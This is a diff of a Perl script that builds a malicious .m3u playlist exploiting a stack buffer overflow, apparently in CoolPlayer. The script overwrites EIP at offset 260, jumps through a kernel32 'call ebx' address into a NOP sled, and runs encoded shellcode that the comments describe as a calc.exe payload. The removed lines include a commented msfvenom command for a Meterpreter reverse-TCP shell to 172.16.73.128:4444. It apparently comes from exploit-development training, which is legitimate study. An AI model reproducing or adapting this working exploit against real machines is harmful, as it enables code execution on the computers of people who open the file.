@@ -1,16 +1,14 @@
 #!/usr/bin/perl
-
-my $buffsize = 10000; #set consistent buffer size
-
-my $jmp = "\x83\xc3\x64" x 3; #add 300 to ebx
-$jmp = $jmp . "\xff\xe3"; # jmp ebx
-my $junk = "\x41" x (260 - length($jmp)); #offset to EIP
-my $eip = pack("V", 0x7c810395); #call ebx from kernel32.dll
-
-my $nops = "\xcc" x 50;
-
-#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\xff' -f perl
-
+my $buffsize = 10000; # set consistent buffer size
+my $jmp = "\xeb\x4"; # 4 bytes short jump to hop over EIP and into nops/shellcode
+my $junk = "\x90" x (260 - length($jmp)); # nops to slide into $jmp; offset to eip overwrite at 260
+my $eip = pack('V',0x7c810395); # call ebx [kernel32.dll] which points to start of buffer and our jump code
+# no usable application module found
+my $nops = "\x90" x 50;
+ 
+# Calc.exe payload [size 227]
+# msfpayload windows/exec CMD=calc.exe R |
+# msfencode -e x86/shikata_ga_nai -t perl -c 1 -b '\x00\x0a\x0d\xff'
 my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
 "\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
 "\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
@@ -28,16 +26,15 @@ my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
 "\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
 "\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
 "\x9a\xca\xc0";
-
-my $sploit = $jmp.$junk.$eip.$nops.$shell; #build sploit portion of buffer
+ 
+my $sploit = $junk.$jmp.$eip.$nops.$shell; # build sploit portion of buffer
 my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
 my $buffer = $sploit.$fill; # build final buffer
-
+ 
 # write the exploit buffer to file
-
-my $file = "coolplayershellcodecalc.m3u";
+my $file = "coolplayer_shortjump.m3u";
 open(FILE, ">$file");
 print FILE $buffer;
 close(FILE);
-print "Exploit file created [" . $file . "]\n";
-print "Buffer size: " . length($buffer). "\n";
+print "Exploit file [" . $file . "] created\n";
+print "Buffer size: " . length($buffer) . "\n";
